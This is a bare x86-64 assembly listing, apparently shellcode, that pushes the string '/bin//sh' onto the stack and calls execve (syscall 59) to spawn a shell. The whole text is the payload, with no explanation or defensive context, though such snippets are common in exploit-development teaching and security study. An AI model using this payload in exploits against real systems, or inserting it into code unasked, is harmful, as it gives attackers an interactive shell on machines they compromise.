        .intel_syntax noprefix
        .globl _start
_start:
        xor rdx, rdx
        push rdx
        mov rdi, 0x68732f2f6e69622f  /* "/bin//sh" */
        push rdi
        mov rdi, rsp
        push rdx
        push rdi
        mov rsi, rsp
        push 59                      /* execve */
        pop rax
        syscall
